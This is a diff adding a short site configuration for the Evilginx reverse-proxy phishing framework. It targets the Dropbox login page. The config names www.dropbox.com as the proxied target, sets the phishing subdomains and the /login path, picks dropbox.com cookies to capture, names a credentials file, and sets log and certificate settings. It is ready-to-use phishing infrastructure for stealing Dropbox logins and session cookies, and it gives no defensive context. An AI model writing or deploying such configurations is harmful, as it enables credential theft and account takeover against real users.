@@ -1,0 +1,12 @@
+[site]
+name=dropbox
+site_conf=["www.dropbox.com.conf"]
+creds_conf=dropbox.creds
+phish_subdomains=["www"]
+phish_paths=["/login"]
+target_hosts=["www.dropbox.com"]
+cookie_hosts=["dropbox.com"]
+redir_arg=rc
+success_arg=rd
+log_name=evilginx-dropbox.log
+cert_subdomains=["www"]
